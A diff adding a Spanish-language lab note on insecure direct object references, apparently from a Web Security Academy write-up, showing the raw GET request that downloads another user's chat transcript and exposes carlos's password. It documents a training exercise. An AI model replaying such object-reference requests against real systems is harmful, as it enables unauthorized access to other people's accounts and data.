@@ -221,11 +221,34 @@ Accept-Encoding: gzip, deflate
 Accept-Language: es-419,es;q=0.9
 Connection: close
 
+```
+
+# Insecure direct object references
+
+Para este laboratorio se tiene un chat este chat carga los archivos primero hace una peticion post y despues una get
+fijarse que peticion exactamente hace que se descargen los txt y ahi ver que se encuentra en este caso 
+se encontro 1.txt con un password de carlos pudindo acceder con esa cuenta.
 
 
 ```
+GET /download-transcript/1.txt HTTP/1.1
+Host: 0a33006103af1594c0a36a3300bc00d9.web-security-academy.net
+Cookie: session=aE2MP1S7C2zwVKvCUIaGsuTunFcYeDja
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a33006103af1594c0a36a3300bc00d9.web-security-academy.net/chat
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
 
 
+```
 
 
 
